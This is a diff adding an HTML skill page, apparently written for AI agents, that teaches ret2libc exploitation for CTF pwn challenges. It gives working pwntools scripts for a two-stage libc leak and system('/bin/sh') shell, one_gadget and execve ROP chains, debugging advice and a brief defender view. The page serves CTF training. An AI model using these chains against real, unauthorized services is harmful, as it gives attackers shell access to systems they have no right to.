@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ctf-pwn-basics-ret2libc</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ctf-pwn-basics-ret2libc</h2><div class="meta"><span class="badge gray">ctf</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when a CTF pwn challenge or authorized lab binary has NX</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="ctf-pwn-basics.html">ctf-pwn-basics</a></div><div class="deps"><span class="kind">requires:</span> <a href="ctf-pwn-basics.html">ctf-pwn-basics</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="pwn-fundamentals.html">pwn-fundamentals</a> <a href="ctf-pwn-basics.html">ctf-pwn-basics</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>pwntools</td><td>4.13</td></tr><tr><td>GDB</td><td>15.2</td></tr><tr><td>ROPgadget</td><td>7.4</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>ret2libc (return-to-libc) defeats non-executable stacks by reusing code that already exists in the process: the C library. Instead of injecting shellcode, you leak the address of a libc function, compute where libc is loaded, and then return into <code>system(&quot;/bin/sh&quot;)</code> or a small ROP chain calling <code>execve</code>. This is the workhorse technique for NX-enabled CTF binaries and the natural second stage after any info leak. This sub-skill covers the authorized methodology: PLT-based leaks, libc identification, the classic two-stage exploit, one_gadget shortcuts, and the alignment and bad-char pitfalls that break otherwise correct chains. Scope is CTF competitions, labs, and explicitly authorized targets only.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm NX is enabled and shellcode is off the table (<code>checksec</code>;</li>
+<p>also confirm no executable stack mapping in gdb <code>vmmap</code>).</p>
+<li>Verify the binary calls at least one libc function through the PLT</li>
+<p>(<code>puts</code>, <code>printf</code>, <code>read</code>); its GOT entry is your leak target.</p>
+<li>Obtain or identify the libc: use the provided <code>libc.so.6</code>, or leak</li>
+<p>two symbols and match them against a libc database.</p>
+<li>Stage 1: overflow to call <code>puts(puts@got)</code> (or <code>write(1, got, 8)</code>)</li>
+<p>then return to <code>main</code> for a second round.</p>
+<li>Parse the leak, set <code>libc.address = leak - libc.symbols[name]</code>, and</li>
+<p>compute <code>system</code> and <code>/bin/sh</code> addresses.</p>
+<li>Stage 2: overflow again with <code>ret; pop rdi; binsh; system</code> (the <code>ret</code></li>
+<p>fixes 16-byte stack alignment on x86-64).</p>
+<li>Test the full chain locally in a loop, then against remote; if</li>
+<p><code>system</code> fails, try the <code>execve</code> ROP chain or a one_gadget.</p>
+<li>Fall back cleanly: log which stage failed (leak parse vs chain crash)</li>
+<p>before changing the payload.</p>
+</ol>
+<h2>1. The two-stage pattern in detail</h2>
+<p>Stage 1 must both leak and give you another chance: returning to <code>main</code> (or <code>_start</code>) re-runs the vulnerable function so stage 2 can be delivered.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+elf = ELF(&quot;./vuln&quot;)
+libc = ELF(&quot;./libc.so.6&quot;)   # challenge-provided, or identified build
+rop = ROP(elf)
+
+OFFSET  = 72
+POP_RDI = rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0]
+RET     = rop.find_gadget([&quot;ret&quot;])[0]
+
+io = process(&quot;./vuln&quot;)
+
+# ---- stage 1: leak puts, return to main ----
+io.sendline(flat(
+    b&quot;A&quot; * OFFSET,
+    POP_RDI, elf.got[&quot;puts&quot;],
+    elf.plt[&quot;puts&quot;],
+    elf.symbols[&quot;main&quot;],
+))
+io.recvline()                                   # consume program banner/echo
+puts_leak = u64(io.recv(6).ljust(8, b&quot;\x00&quot;))   # 6 bytes: top bytes are zero
+libc.address = puts_leak - libc.symbols[&quot;puts&quot;]
+log.success(f&quot;libc base {hex(libc.address)}&quot;)
+
+# ---- stage 2: system(&quot;/bin/sh&quot;) ----
+binsh = next(libc.search(b&quot;/bin/sh&quot;))
+io.sendline(flat(
+    b&quot;A&quot; * OFFSET,
+    RET,                    # stack alignment for movaps in system
+    POP_RDI, binsh,
+    libc.symbols[&quot;system&quot;],
+    b&quot;exit&quot;,                # clean exit gadget optional; harmless padding
+))
+io.interactive()</code></pre>
+<p>Leak parsing notes: <code>puts</code> prints the address as raw bytes followed by a newline; taking 6 bytes and zero-padding works because libc addresses on Linux are 6 significant bytes. Prefer <code>io.recvuntil</code> on a known delimiter the program prints after the leak to avoid short reads.</p>
+<h2>2. Identifying the remote libc</h2>
+<p>When the challenge does not ship <code>libc.so.6</code>, leak at least two distinct symbols and match the pair. Two symbols disambiguate builds that one symbol cannot.</p>
+<pre><code class="language-python"># stage 1 variant: leak puts AND read in one go
+io.sendline(flat(
+    b&quot;A&quot; * OFFSET,
+    POP_RDI, elf.got[&quot;puts&quot;], elf.plt[&quot;puts&quot;],
+    POP_RDI, elf.got[&quot;read&quot;], elf.plt[&quot;puts&quot;],
+    elf.symbols[&quot;main&quot;],
+))</code></pre>
+<p>Take the last 12 hex digits of each leaked address to a libc database search (public libc-database services accept <code>puts=...&amp;read=...</code> style queries). Download the matching build, verify locally that <code>leak - sym == base</code> for both symbols, then use that file in the exploit. Never mix offsets from one libc build with a base computed from another.</p>
+<h2>3. one_gadget shortcuts</h2>
+<p>A one_gadget is a single address in libc that spawns a shell when jumped to, provided its constraints hold (e.g. <code>rsp+0x40 == NULL</code>, <code>rax == NULL</code>).</p>
+<pre><code class="language-bash"># List candidates in the identified libc
+one_gadget ./libc.so.6
+# 0xebc81 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+#   constraints:
+#     [rsp+0x30] == NULL
+# 0xebc85 execve(&quot;/bin/sh&quot;, rsp+0x38, environ)
+#   ...</code></pre>
+<pre><code class="language-python"># stage 2 becomes a single address when a constraint is satisfiable
+ONE = libc.address + 0xebc81
+io.sendline(flat(b&quot;A&quot; * OFFSET, ONE))</code></pre>
+<p>Verify constraints in gdb before relying on them: break at the gadget, check <code>x/gx $rsp+0x30</code>, and confirm the registers the constraint names. In CTFs the stack layout at your overflow point often satisfies one of the listed gadgets with zero extra work, which makes one_gadget the fastest stage 2 when it fits.</p>
+<h2>4. execve ROP chain (no system)</h2>
+<p>Some binaries or libc builds make <code>system</code> awkward (filtered strings, missing symbol). Build <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> directly:</p>
+<pre><code class="language-python">POP_RDI = rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0]
+POP_RSI = rop.find_gadget([&quot;pop rsi&quot;, &quot;ret&quot;])[0]
+POP_RDX = rop.find_gadget([&quot;pop rdx&quot;, &quot;ret&quot;])[0]
+# rdx gadget often looks like &quot;pop rdx ; pop r12 ; ret&quot; -&gt; pad the extra pop
+BINSH = next(libc.search(b&quot;/bin/sh&quot;))
+
+payload = flat(
+    b&quot;A&quot; * OFFSET,
+    RET,
+    POP_RDI, BINSH,
+    POP_RSI, 0,
+    POP_RDX, 0, 0,          # extra 0 for the pop r12 in the gadget
+    libc.symbols[&quot;execve&quot;],
+)</code></pre>
+<p>If no <code>/bin/sh</code> string exists in libc (rare) or binary, write one with a first-stage <code>read</code>/<code>gets</code> into a known writable address (<code>.bss</code>), then reference that address.</p>
+<h2>5. Stack alignment: the movaps crash</h2>
+<p>On x86-64 System V ABI, the stack must be 16-byte aligned before a <code>call</code>. An overflow payload usually enters with <code>rsp % 16 == 8</code>, so the first libc call crashes inside <code>movaps</code> (which requires aligned memory) even though every address is correct. Symptoms: crash inside <code>system</code>/<code>execve</code> at a <code>movaps</code> instruction, with correct-looking registers. Fix: prepend a single <code>ret</code> gadget (any <code>c3</code> byte) before the first real gadget. If the chain has an odd number of 8-byte slots before the call, alignment is already fixed; count slots when debugging.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The binary is statically linked: there is no libc to return into, but</li>
+<p>every gadget and syscall is in the binary itself; use <code>ROP(elf)</code> gadgets plus a direct <code>syscall</code> gadget for <code>execve</code> (rax=59).</p>
+<li><code>puts</code> is not in the PLT: leak with <code>write(1, got_addr, 8)</code> using a</li>
+<p><code>pop rsi; pop rdx; ret</code> gadget, or use any other PLT function.</p>
+<li>The program does not return to <code>main</code> cleanly (calls <code>exit</code>): do the</li>
+<p>whole exploit in one stage by leaking via a format string first, then sending the final chain, or use a stack pivot to a second buffer.</p>
+<li>Remote service closes after first stage: some challenges fork per</li>
+<p>connection; keep one connection per stage and recompute nothing between them, or do leak and exploit in a single payload with a two-part ROP chain.</p>
+<li>ASLR re-randomizes libc per connection: the two-stage pattern handles</li>
+<p>this because the leak and the use happen in the same process lifetime.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Stage 1 leak returns garbage: the PLT/GOT addresses may be wrong for a</li>
+<p>PIE binary; add the leaked PIE base first, or the program prints a prefix you must skip with <code>recvuntil</code>.</p>
+<li><code>system</code> returns immediately with no shell: <code>/bin/sh</code> address is wrong</li>
+<p>(bad libc build) or stdin is not a tty; try <code>io.interactive()</code> after sending <code>execve</code> chain instead, and check the libc identification again.</p>
+<li>one_gadget crashes: constraints not met; dump registers at the gadget</li>
+<p>in gdb and pick a different candidate, or fall back to the manual <code>system</code> chain which has no constraints.</p>
+<li>No <code>pop rdi</code> gadget in a small binary: use <code>__libc_csu_init</code> gadgets</li>
+<p>(the classic csu chain) to control rdi/rsi/rdx, or ret2csu then jump to the PLT.</p>
+<li>Full RELRO plus no useful PLT entries: combine with a format string</li>
+<p>leak sub-skill approach, or look for a <code>win</code> function the challenge author left in.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see ret2libc as a two-phase network pattern: a first connection carrying a long input followed by a second carrying another long input, then a shell spawned by a network daemon. ROP chains leave distinctive stack traces (many returns into libc without calls). Defenses: NX/DEP is baseline, but ret2libc specifically is blunted by ASLR with high entropy, control-flow integrity (Intel CET, ARM PAC), and seccomp filters that deny <code>execve</code> to network services. Monitoring for <code>execve</code> from unexpected parents (a web worker spawning <code>/bin/sh</code>) is a strong detection.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1068 (Exploitation for Privilege Escalation).</li>
+<li>CWE-121 (Stack-based Buffer Overflow) and CWE-787 (Out-of-bounds</li>
+<p>Write): the underlying bug class.</p>
+<li>pwntools ROP and ELF docs: https://docs.pwntools.com/</li>
+<li>one_gadget tool: https://github.com/david942j/one_gadget</li>
+<li>&quot;Smashing the Stack for Fun and Profit&quot; (classic background reading).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
